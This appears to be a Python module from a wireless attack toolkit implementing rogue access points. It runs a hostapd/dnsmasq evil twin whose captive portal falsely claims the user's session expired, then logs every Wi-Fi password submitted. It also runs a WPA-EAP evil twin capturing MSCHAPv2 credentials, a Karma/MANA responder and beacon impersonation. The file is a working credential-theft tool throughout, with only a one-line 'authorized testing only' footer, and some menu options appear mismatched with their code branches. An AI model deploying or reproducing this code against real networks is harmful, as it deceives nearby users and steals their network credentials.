"""
Evil AP module - rogue access point + captive portal.

Two engines:
  1. hostapd/dnsmasq based (Linux, real clients can connect) with a captive
     portal that logs every credential entered.
  2. Scapy-based beacon impersonation / monitoring-only (no association).
"""
import socket
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from open80211.core import ui
from open80211.core.config import CONFIG, is_linux
from open80211.core.interfaces import which
from open80211.core import netutils as nu

PORTAL_HTML = """<!DOCTYPE html>
<html><head><title>WiFi Authentication</title>
<style>body{font-family:Arial;text-align:center;margin-top:80px}
input{padding:10px;width:260px;margin:6px}button{padding:10px 30px}
</style></head><body>
<h2>Secure Wireless Authentication</h2>
<p>Your session has expired. Please enter your Wi-Fi password to continue.</p>
<form method="POST" action="/login">
<input type="password" name="password" placeholder="Wi-Fi Password"><br>
<input type="hidden" name="ssid" value="{ssid}">
<button type="submit">Connect</button></form>
<p style="color:#888;font-size:12px">Rogue AP - authorized testing only</p>
</body></html>"""

PORTAL_SUCCESS = """<!DOCTYPE html><html><head><title>Done</title></head>
<body style="font-family:Arial;text-align:center;margin-top:100px">
<h2>Connecting...</h2><p>Please wait while your device re-associates.</p></body></html>"""


class PortalHandler(BaseHTTPRequestHandler):
    engine = None

    def log_message(self, *a):
        pass

    def do_GET(self):
        html = PORTAL_HTML.format(ssid=self.engine.ssid).encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(html)))
        self.end_headers()
        self.wfile.write(html)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        body = self.rfile.read(length).decode(errors="replace")
        self.engine.capture(body, self.client_address[0])
        html = PORTAL_SUCCESS.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html)


class EvilAP:
    def __init__(self, iface: str, ssid: str, bssid: str = "",
                 channel: int = 6, password: str = ""):
        self.iface = iface
        self.ssid = ssid
        self.bssid = bssid or nu.int2mac(__import__("random").getrandbits(48))
        self.channel = channel
        self.password = password
        self.captures = []
        self._processes = []

    # --- hostapd + dnsmasq (real evil AP) --------------------------------

    def write_configs(self) -> tuple:
        """Write hostapd/dnsmasq configs into the session dir. Returns (hconf, dconf)."""
        hconf = CONFIG.session_dir / f"hostapd-{self.ssid}.conf"
        dconf = CONFIG.session_dir / f"dnsmasq-{self.ssid}.conf"
        wpa_line = ("wpa=2\nwpa_passphrase=" + self.password
                    if self.password else "wpa=0")
        hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
{wpa_line}
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
auth_algs=1
macaddr_acl=0
ignore_broadcast_ssid=0
""", encoding="utf-8")
        dconf.write_text(f"""interface={self.iface}
dhcp-range=192.168.100.2,192.168.100.100,255.255.255.0,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
address=/#/192.168.100.1
""", encoding="utf-8")
        return hconf, dconf

    def start_hostapd(self) -> bool:
        if not which("hostapd"):
            ui.error("hostapd not found. Install: apt install hostapd")
            return False
        hconf, _ = self.write_configs()
        ui.info(f"Starting hostapd ({self.ssid})...")
        try:
            p = subprocess.Popen(["hostapd", str(hconf)],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(2)
            if p.poll() is None:
                ui.ok("Rogue AP is broadcasting.")
                return True
            ui.error("hostapd exited. Check driver support.")
            return False
        except Exception as e:
            ui.error(str(e))
            return False

    def start_dnsmasq(self) -> bool:
        if not which("dnsmasq"):
            ui.error("dnsmasq not found. Install: apt install dnsmasq")
            return False
        _, dconf = self.write_configs()
        ui.info("Starting dnsmasq (DHCP + DNS)...")
        try:
            p = subprocess.Popen(["dnsmasq", "-C", str(dconf), "--no-daemon"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(1)
            return True
        except Exception as e:
            ui.error(str(e))
            return False

    # --- captive portal --------------------------------------------------

    def start_portal(self, port: int = 80) -> bool:
        PortalHandler.engine = self
        try:
            self._portal = ThreadingHTTPServer(("0.0.0.0", port), PortalHandler)
            threading.Thread(target=self._portal.serve_forever, daemon=True).start()
            ui.ok(f"Captive portal serving on :{port}")
            return True
        except Exception as e:
            ui.error(f"Portal failed: {e}")
            return False

    def capture(self, body: str, client: str):
        entry = {"time": time.time(), "client": client, "post": body}
        self.captures.append(entry)
        ui.warn(f"[PORTAL] {client} submitted: {body}")
        p = CONFIG.session_dir / "portal_credentials.log"
        with open(p, "a", encoding="utf-8") as f:
            f.write(f"{time.time()} {client} {body}\n")

    # --- scapy impersonation fallback -----------------------------------

    def beacon_impersonate(self, duration: int = 60) -> None:
        ui.warn("Scapy beacon impersonation (no association support; "
                "use hostapd engine for a real rogue AP).")
        try:
            from scapy.all import sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt
            from open80211.core.interfaces import set_channel
            set_channel(self.iface, self.channel)
            end = time.time() + duration
            while time.time() < end:
                pkt = RadioTap() / Dot11(type=0, subtype=8,
                                         addr1="ff:ff:ff:ff:ff:ff",
                                         addr2=self.bssid, addr3=self.bssid) / \
                    Dot11Beacon(cap=0x2104) / \
                    Dot11Elt(ID=0, info=self.ssid.encode()) / \
                    Dot11Elt(ID=3, info=bytes([self.channel])) / \
                    Dot11Elt(ID=1, info=b"\x82\x84\x0b\x16")
                sendp(pkt, iface=self.iface, verbose=False)
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        except Exception as e:
            ui.error(str(e))

    # --- enterprise / karma (hostapd-mana) ------------------------------

    def write_enterprise_configs(self) -> tuple:
        """WPA-EAP evil twin: hostapd-mana + eap_user file. Captures MSCHAPv2."""
        hconf = CONFIG.session_dir / f"mana-{self.ssid}.conf"
        econf = CONFIG.session_dir / f"mana-{self.ssid}.eap_user"
        cred_out = CONFIG.session_dir / f"mana-{self.ssid}.creds"
        econf.write_text('*        WPA-EAP  "open80211"\n', encoding="utf-8")
        handshake_out = CONFIG.session_dir / "mana-{}.handshakes".format(self.ssid)
        psk_out = CONFIG.session_dir / "mana-{}.psk".format(self.ssid)
        hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
wpa=3
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file={econf}
mana_wpaout={handshake_out}
mana_eapsuccess=1
mana_credout={cred_out}
mana_pskout={psk_out}
auth_algs=1
eapol_key_index_workaround=0
""", encoding="utf-8")
        return hconf, cred_out

    def start_enterprise(self) -> bool:
        if not which("hostapd-mana") and not which("hostapd"):
            ui.error("hostapd(-mana) not found. apt install hostapd-mana")
            return False
        hconf, cred_out = self.write_enterprise_configs()
        binary = "hostapd-mana" if which("hostapd-mana") else "hostapd"
        ui.info(f"Starting WPA-EAP evil twin via {binary}...")
        try:
            p = subprocess.Popen([binary, str(hconf)],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(2)
            if p.poll() is None:
                ui.ok("Enterprise evil twin is up. Credentials -> %s" % cred_out)
                return True
            ui.error("hostapd exited. Driver/AP mode unsupported?")
            return False
        except Exception as e:
            ui.error(str(e))
            return False

    def write_karma_config(self, wpa: bool = False) -> str:
        """Karma / MANA: respond to ALL probe requests with a matching network."""
        hconf = CONFIG.session_dir / f"karma-{self.ssid}.conf"
        cred_out = CONFIG.session_dir / f"karma-{self.ssid}.creds"
        if wpa:
            pw = self.password or "open80211"
            psk_out = CONFIG.session_dir / "karma-{}.psk".format(self.ssid)
            hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
wpa=2
wpa_passphrase={pw}
wpa_key_mgmt=WPA-PSK
mana_wpa=1
mana_credout={cred_out}
mana_pskout={psk_out}
""", encoding="utf-8")
        else:
            hconf.write_text(f"""interface={self.iface}
ssid={self.ssid}
bssid={self.bssid}
hw_mode=g
channel={self.channel}
mana_open=1
mana_credout={cred_out}
""", encoding="utf-8")
        return str(hconf)

    def start_karma(self, wpa: bool = False) -> bool:
        if not which("hostapd-mana"):
            ui.error("hostapd-mana not found (Karma/MANA requires it).")
            return False
        hconf = self.write_karma_config(wpa)
        ui.info("Starting Karma/MANA responder AP...")
        try:
            p = subprocess.Popen(["hostapd-mana", hconf],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self._processes.append(p)
            time.sleep(2)
            if p.poll() is None:
                ui.ok("Karma AP broadcasting - it answers any SSID probe.")
                return True
            ui.error("hostapd-mana exited.")
            return False
        except Exception as e:
            ui.error(str(e))
            return False

    def stop(self) -> None:
        for p in self._processes:
            try:
                p.terminate()
            except Exception:
                pass
        self._processes = []
        ui.info("Evil AP stopped.")


def evil_ap_menu(iface: str) -> None:
    while True:
        choice = ui.menu("Evil AP Suite", [
            "Launch rogue AP (hostapd + dnsmasq + captive portal)",
            "Rogue AP with password (WPA2)",
            "Open rogue AP (no password)",
            "Enterprise evil twin (WPA-EAP, captures MSCHAPv2)",
            "Karma / MANA AP (answers all probes)",
            "Scapy beacon impersonation (monitor only)",
            "Show captured portal credentials",
        ])
        if choice == 0:
            return
        if not is_linux():
            ui.warn("Evil AP requires Linux + a WiFi adapter (monitor/AP mode).")
            continue
        ssid = ui.ask("SSID to broadcast")
        if not ssid:
            continue
        bssid = ui.ask("BSSID (blank = random)", default="")
        ch = ui.ask_int("Channel", default=6)
        if choice == 1:
            pw = ui.ask("WPA2 passphrase (min 8 chars)")
            if len(pw) < 8:
                ui.warn("Passphrase must be at least 8 characters.")
                continue
            ap = EvilAP(iface, ssid, bssid, ch, pw)
        elif choice == 2:
            ap = EvilAP(iface, ssid, bssid, ch)
        elif choice == 3:
            ap = EvilAP(iface, ssid, bssid, ch)
            ap.start_enterprise()
            ap.start_dnsmasq()
            ap.start_portal()
            ui.info("Press Enter to stop.")
            ui.press_enter()
            ap.stop()
            continue
        elif choice == 4:
            ap = EvilAP(iface, ssid, bssid, ch)
            wpa = ui.confirm("Karma with WPA-PSK? (else open)", default=False)
            ap.start_karma(wpa)
            ui.info("Press Enter to stop.")
            ui.press_enter()
            ap.stop()
            continue
        elif choice == 5:
            ap = EvilAP(iface, ssid, bssid, ch)
            dur = ui.ask_int("Duration (seconds)", default=60)
            ap.beacon_impersonate(dur)
            continue
        else:
            ap = EvilAP(iface, ssid, bssid, ch)
        ap.start_hostapd()
        ap.start_dnsmasq()
        ap.start_portal()
        ui.info("Press Enter to stop the Evil AP.")
        ui.press_enter()
        ap.stop()